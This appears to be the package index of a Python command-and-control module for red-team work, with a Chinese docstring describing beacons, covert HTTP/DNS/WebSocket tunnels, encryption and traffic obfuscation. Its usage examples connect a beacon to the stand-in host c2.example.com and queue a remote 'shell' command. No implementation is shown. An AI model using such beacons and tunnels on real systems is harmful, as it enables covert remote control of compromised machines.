#!/usr/bin/env python3
"""
C2 通信模块 - Command and Control Module

提供完整的 C2 通信能力，包括:
    - Beacon 心跳通信
    - 多种隧道类型 (HTTP/DNS/WebSocket)
    - 加密通信
    - 协议编解码

仅用于授权渗透测试和安全研究

Usage:
    # 创建 Beacon
    from core.c2 import create_beacon, BeaconConfig

    config = BeaconConfig(
        server="c2.example.com",
        port=443,
        protocol="https"
    )
    beacon = create_beacon("c2.example.com")
    beacon.run()

    # 创建服务器
    from core.c2 import start_beacon_server

    server = start_beacon_server(port=8080)
    server.add_task(beacon_id, "shell", "whoami")

    # 使用隧道
    from core.c2 import create_tunnel, HTTPTunnel

    tunnel = create_tunnel("https", "c2.example.com", 443)
    tunnel.connect()
    tunnel.send(b"data")
    tunnel.disconnect()

    # 加密
    from core.c2 import C2Crypto

    crypto = C2Crypto("aes256_gcm")
    encrypted = crypto.encrypt(b"secret")
    decrypted = crypto.decrypt(encrypted.ciphertext, encrypted.iv, encrypted.tag)
"""

# 基础类和数据结构
from .base import (
    C2Status,
    TunnelType,
    C2Config,
    Task,
    TaskResult,
    BeaconInfo,
    BaseTunnel,
    BaseC2,
    TaskTypes,
)

# Beacon 通信
from .beacon import (
    BeaconMode,
    BeaconConfig,
    Beacon,
    BeaconServer,
    create_beacon,
    start_beacon_server,
)

# 隧道
from .tunnels import (
    HTTPTunnel,
    DNSTunnel,
    WebSocketTunnel,
    create_tunnel,
    get_tunnel_class,
    register_tunnel,
    list_available_tunnels,
    TUNNEL_REGISTRY,
)

# 加密
from .crypto import (
    CryptoAlgorithm,
    CryptoResult,
    C2Crypto,
    create_crypto,
    quick_encrypt,
    quick_decrypt,
    HAS_CRYPTOGRAPHY,
    HAS_PYCRYPTODOME,
)

# 编码
from .encoding import (
    EncodingType,
    EncodedData,
    C2Encoder,
    ChunkEncoder,
    JSONEncoder,
    TrafficObfuscator,
    base64_encode,
    base64_decode,
    base32_encode,
    base32_decode,
    url_safe_encode,
    url_safe_decode,
)

# 协议
from .protocol import (
    PROTOCOL_MAGIC,
    PROTOCOL_VERSION,
    HEADER_SIZE,
    MessageType,
    MessageFlags,
    MessageHeader,
    Message,
    ProtocolCodec,
    HTTPProtocolAdapter,
    encode_heartbeat,
    decode_heartbeat,
    encode_tasks,
    decode_tasks,
    encode_result,
    decode_result,
)


# 向后兼容 - 保留旧版本的类名
LightBeacon = Beacon
TunnelConfig = C2Config


__all__ = [
    # 基础类
    'C2Status',
    'TunnelType',
    'C2Config',
    'Task',
    'TaskResult',
    'BeaconInfo',
    'BaseTunnel',
    'BaseC2',
    'TaskTypes',

    # Beacon
    'BeaconMode',
    'BeaconConfig',
    'Beacon',
    'BeaconServer',
    'create_beacon',
    'start_beacon_server',

    # 隧道
    'HTTPTunnel',
    'DNSTunnel',
    'WebSocketTunnel',
    'create_tunnel',
    'get_tunnel_class',
    'register_tunnel',
    'list_available_tunnels',
    'TUNNEL_REGISTRY',

    # 加密
    'CryptoAlgorithm',
    'CryptoResult',
    'C2Crypto',
    'create_crypto',
    'quick_encrypt',
    'quick_decrypt',
    'HAS_CRYPTOGRAPHY',
    'HAS_PYCRYPTODOME',

    # 编码
    'EncodingType',
    'EncodedData',
    'C2Encoder',
    'ChunkEncoder',
    'JSONEncoder',
    'TrafficObfuscator',
    'base64_encode',
    'base64_decode',
    'base32_encode',
    'base32_decode',
    'url_safe_encode',
    'url_safe_decode',

    # 协议
    'PROTOCOL_MAGIC',
    'PROTOCOL_VERSION',
    'HEADER_SIZE',
    'MessageType',
    'MessageFlags',
    'MessageHeader',
    'Message',
    'ProtocolCodec',
    'HTTPProtocolAdapter',
    'encode_heartbeat',
    'decode_heartbeat',
    'encode_tasks',
    'decode_tasks',
    'encode_result',
    'decode_result',

    # 向后兼容
    'LightBeacon',
    'TunnelConfig',
]


# 版本信息
__version__ = '2.0.0'
__author__ = 'AutoRedTeam'
